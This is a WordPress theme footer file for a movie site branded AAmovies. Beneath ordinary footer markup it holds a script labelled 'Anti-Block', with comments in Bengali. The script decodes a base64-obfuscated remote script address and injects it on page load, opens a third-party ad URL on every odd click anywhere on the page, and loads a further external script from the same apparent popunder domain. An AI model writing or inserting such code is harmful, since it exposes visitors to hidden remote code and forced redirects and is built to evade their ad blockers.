<?php
/**
 * Boimate footer and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Boimate.Com
 * @since Boimate 1.0
 */
global $movielinkbd;
?>

<footer class="sticky-footer bg-white">
  <div class="container my-auto">
    <div style="display:flex;gap:10px;justify-content:center;margin-bottom:15px;"><a href="https://t.me/aamoviesofficial" target="_blank" style="width:36px;height:36px;border-radius:50%;background:#1a1b23;display:flex;align-items:center;justify-content:center;color:#f8f9fc;border:1px solid #2a2b35;text-decoration:none;"><i class="fab fa-telegram"></i></a><a href="https://facebook.com" target="_blank" style="width:36px;height:36px;border-radius:50%;background:#1a1b23;display:flex;align-items:center;justify-content:center;color:#f8f9fc;border:1px solid #2a2b35;text-decoration:none;"><i class="fab fa-facebook-f"></i></a><a href="https://youtube.com" target="_blank" style="width:36px;height:36px;border-radius:50%;background:#1a1b23;display:flex;align-items:center;justify-content:center;color:#f8f9fc;border:1px solid #2a2b35;text-decoration:none;"><i class="fab fa-youtube"></i></a></div>
<div class="copyright text-center my-auto">
      <span style="color: yellow !important; font-weight: bold;">
        Copyright © <?php if($movielinkbd['copyright_year']>0){echo $movielinkbd['copyright_year'];}else{echo date('Y');}?>
        <a href="//<?php echo $movielinkbd['copyright_link'];?>/" style="color: yellow !important;">| <?php echo $movielinkbd['copyright_name'];?>  <?php echo $movielinkbd['copyright_link'];?></a> <!-- Link color and bold -->
      </span> | By <a href="https://AAmovies.com">AAMOVIES</a>
      <div>
      </div>
    </div>
  </div>
</footer>

<script src="<?php echo get_template_directory_uri(); ?>/includes/jquery/lazy.js" type="text/javascript"></script>
<script type="text/javascript">  var bLazy = new Blazy({ selector: 'img', success: function(element){ setTimeout(function(){ var parent = element.parentNode; parent.className = parent.className.replace(/\bloading\b/,''); }, 200); } });</script>
<?php wp_footer();?>
<!-- AAmovies Anti-Block Script with Everywhere Odd-Click Trigger -->
<script>
document.addEventListener("DOMContentLoaded", function() {
    // ক্লিক কাউন্টার সেটআপ
    let clickCount = localStorage.getItem('adClickCount') || 0;
    
    // ৩ সেকেন্ড পর স্ক্রিপ্ট লোড হবে
    setTimeout(function() {
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = atob('Ly9pbm51bWVyYWJsZWRlY2xpbmVkcmVwZW50YW5jZS5jb20vZTIvNWIvN2EvZTJiN2E3ZDMxOWM3OTk4ZDBlZmQ1MDIxMjZiOTZkOS5qcw==');
        document.body.appendChild(script);
        
        // সব এলিমেন্টে ক্লিক ইভেন্ট যোগ
        document.addEventListener('click', function(e) {
            // বিজোড় ক্লিক (1st, 3rd, 5th...) হলে এড দেখান
            if (clickCount % 2 === 0) {
                // সব ধরনের ক্লিকেই এড দেখানো হবে
                window.open('https://sunkendifferextreme.com/ehnbus360e?key=a30f9a2ed9acb00aa432448fe9a9e6fa', '_blank');
            }
            
            // ক্লিক কাউন্ট বাড়ান
            clickCount++;
            localStorage.setItem('adClickCount', clickCount);
        });
    }, 1000);
});
</script>
<script type='text/javascript' src='//sunkendifferextreme.com/e2/5b/7a/e25b7a7d319c7998d0efd502126b96d1.js'></script>
</body>
</html>